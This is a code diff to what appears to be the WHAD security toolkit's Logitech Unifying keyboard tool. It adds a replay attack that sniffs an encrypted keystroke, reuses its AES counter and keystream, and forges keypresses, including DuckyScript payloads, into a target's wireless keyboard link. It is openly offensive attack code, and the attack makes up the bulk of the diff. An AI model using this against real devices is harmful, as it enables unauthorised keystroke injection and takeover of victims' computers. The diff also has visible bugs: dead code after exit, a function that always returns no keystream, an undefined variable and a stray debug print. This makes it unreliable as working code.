@@ -12,7 +12,9 @@ import logging
 # Whad dependencies
 from pynput import mouse
 from whad.cli.app import CommandLineSink, run_app
-from whad.unifying.connector import Keyboard, Keylogger, ESBAddress
+from whad.cli.ui import info, error, warning, success
+from whad.unifying.connector import Sniffer, Keyboard, Keylogger, ESBAddress
+from whad.scapy.layers.unifying import Logitech_Encrypted_Keystroke_Payload
 from whad.unifying.stack.constants import ClickType
 from whad.esb.exceptions import InvalidESBAddressException
 from whad.exceptions import WhadDeviceNotFound
@@ -467,7 +469,7 @@ class DuckyScriptRunner(object):
                 shift = True
             elif key in ["CONTROL", "CTRL", "RCTRL", "RCONTROL"]:
                 ctrl = True
-            elif key in ["ALT", "RALT"]:
+            elif key in ["ALT", "LALT", "RALT"]:
                 alt = True
             else:
                 other_keys.append(key)
@@ -477,6 +479,7 @@ class DuckyScriptRunner(object):
             key = ""
 
         # Send key through connector
+        print(key, gui, alt, shift, ctrl)
         self.__connector.send_key(key, gui=gui, alt=alt, shift=shift, ctrl=ctrl)
         
     def set_delay(self, delay):
@@ -520,6 +523,17 @@ class UniKeyboardApp(CommandLineSink):
             description=TOOL_DESCRIPTION,
             interface=True,
             commands=False
+        )
+
+
+        # Replay AES counter option
+        self.add_argument(
+            "-r",
+            "--replay-aes-counter",
+            dest='replay',
+            action='store_true',
+            default=False,
+            help="Sniff a valid keystroke from dongle, then forge the keypresses with a replayed AES counter"
         )
 
         # Target device address option
@@ -573,6 +587,20 @@ class UniKeyboardApp(CommandLineSink):
             help="Set encryption key (hex), will enable encryption/decryption if set"
         )
 
+    def perform_replay_attack_capture(self, address):
+        if self.args.replay:
+            info("Capturing encrypted keystroke...")
+            encrypted_keystroke = self.capture_encrypted_keystroke(address)
+            if encrypted_keystroke is None:
+                self.error("An error occured during the keystroke capture.")
+                exit(1)
+
+                aes_counter = encrypted_keystroke.aes_counter
+                forge_keystream = encrypted_keystroke.hid_data + bytes([encrypted_keystroke.unknown])
+
+                success("Encrypted keystroke captured - AES counter: " + str(aes_counter)+ " / Encrypted Payload =  " + forge_keystream.hex())                                    
+        return 0, None
+        
     def run(self):
         """Override App's run() method to handle scripting feature.
         """
@@ -607,14 +635,19 @@ class UniKeyboardApp(CommandLineSink):
                         
                         # If -p/--payload option is set, sync and replicate our mouse moves
                         if self.args.payload is not None:
-                            self.send_payload(addr, self.args.payload, self.args.locale, key=enc_key)
+                            aes_counter, forge_keystream = self.perform_replay_attack_capture(addr)
+                            self.send_payload(addr, self.args.payload, self.args.locale, key=enc_key, aes_counter=aes_counter, forge_keystream=hid_data)
+
                         elif self.args.ducky is not None:
-                            self.send_ducky(addr, self.args.ducky, self.args.locale, key=enc_key)
+                            aes_counter, forge_keystream = self.perform_replay_attack_capture(addr)
+                            self.send_ducky(addr, self.args.ducky, self.args.locale, key=enc_key, aes_counter=aes_counter, forge_keystream=forge_keystream)
                         else:
+
                             # If stdin is piped, then we expect some mouse moves and clicks
                             # coming from stdin
                             if self.is_stdin_piped():
-                                self.send_stdin(addr, self.args.locale, key=enc_key)
+                                aes_counter, forge_keystream = self.perform_replay_attack_capture(addr)
+                                self.send_stdin(addr, self.args.locale, key=enc_key, aes_counter=aes_counter, forge_keystream=forge_keystream)
                             else:
                                 
                                 # Log keyboard events
@@ -632,7 +665,35 @@ class UniKeyboardApp(CommandLineSink):
         # Launch post-run tasks
         self.post_run()
 
-    def send_payload(self, address: ESBAddress, payload: str, locale: str, key: bytes = None):
+    def capture_encrypted_keystroke(self, address: ESBAddress):
+        """Capture an encrypted keystroke from an existing keyboard.
+        """
+        try:
+            connector = Sniffer(self.interface)
+            connector.address = str(address)
+            connector.scanning = True
+            connector.start()
+
+            key_press = None
+            key_release = None
+
+            for pkt in connector.sniff():
+                if Logitech_Encrypted_Keystroke_Payload in pkt:
+                    if key_press is None:
+                        key_press = pkt
+                    elif key_release is None:
+                        key_release = pkt
+                        break
+
+            connector.stop()
+            connector.close()
+            return key_release
+
+        except (KeyboardInterrupt, SystemExit):
+            connector.stop()
+            return None
+
+    def send_payload(self, address: ESBAddress, payload: str, locale: str, key: bytes = None, aes_counter:int=0, forge_keystream:bytes=None):
         """Send payload to target keyboard.
         """
         # Connect to target device and performs discovery
@@ -647,7 +708,10 @@ class UniKeyboardApp(CommandLineSink):
             # Set encryption key and counter if key is provided
             if key is not None:
                 connector.key = key
-                connector.aes_counter = 0
+                connector.aes_counter = aes_counter
+            elif forge_keystream is not None:
+                connector.forge_keystream = forge_keystream
+                connector.aes_counter = aes_counter
 
             # Start connector (enable keyboard mode)
             connector.start()
@@ -668,7 +732,7 @@ class UniKeyboardApp(CommandLineSink):
         except (KeyboardInterrupt, SystemExit):
             connector.stop()
 
-    def send_ducky(self, address: ESBAddress, ducky_script: str, locale: str, key: bytes = None):
+    def send_ducky(self, address: ESBAddress, ducky_script: str, locale: str, key: bytes = None, aes_counter:int=0, forge_keystream:bytes=None):
         """Send ducky script
         """
         # Create our keyboard connector and set target address
@@ -682,7 +746,10 @@ class UniKeyboardApp(CommandLineSink):
         # Set encryption key and counter if key is provided
         if key is not None:
             connector.key = key
-            connector.aes_counter = 0
+            connector.aes_counter = aes_counter
+        elif forge_keystream is not None:
+            connector.forge_keystream = forge_keystream
+            connector.aes_counter = aes_counter
 
         # Start connector (enable keyboard mode)
         connector.start()
@@ -699,7 +766,7 @@ class UniKeyboardApp(CommandLineSink):
         connector.unlock()
         connector.stop()
 
-    def send_stdin(self, address: ESBAddress, locale: str, key: bytes = None):
+    def send_stdin(self, address: ESBAddress, locale: str, key: bytes = None, aes_counter : int = 0 , forge_keystream : bytes = None):
         """Read lines from stdin and send text (including ENTER) to target
         keyboard.
         """
@@ -715,8 +782,10 @@ class UniKeyboardApp(CommandLineSink):
             # Set encryption key and counter if key is provided
             if key is not None:
                 connector.key = key
-                connector.aes_counter = 0
-
+                connector.aes_counter = aes_counter
+            elif forge_keystream is not None:
+                connector.forge_keystream = forge_keystream
+                connector.aes_counter = aes_counter
             # Start connector (enable keyboard mode)
             connector.start()
 
@@ -755,7 +824,8 @@ class UniKeyboardApp(CommandLineSink):
             if key is not None:
                 connector.decrypt = True
                 connector.add_key(key)
-
+            else:
+                warning("No encryption key provided, keystrokes will probably be invalid.")
             # Start logging keyboard events
             connector.start()
             out = ""
